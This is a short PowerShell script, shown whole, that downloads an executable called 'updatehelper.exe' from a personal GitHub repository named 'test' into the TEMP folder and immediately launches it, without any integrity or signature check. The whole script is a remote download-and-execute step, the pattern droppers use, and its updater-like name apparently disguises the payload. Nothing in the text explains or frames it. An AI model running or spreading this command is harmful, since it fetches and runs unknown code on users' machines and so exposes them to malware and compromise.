[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://github.com/wabor1/test/releases/download/1/updatehelper.exe"
$target = "$env:TEMP\updatehelper.exe"
Invoke-WebRequest -Uri $url -OutFile $target -UseBasicParsing
Start-Process $target   
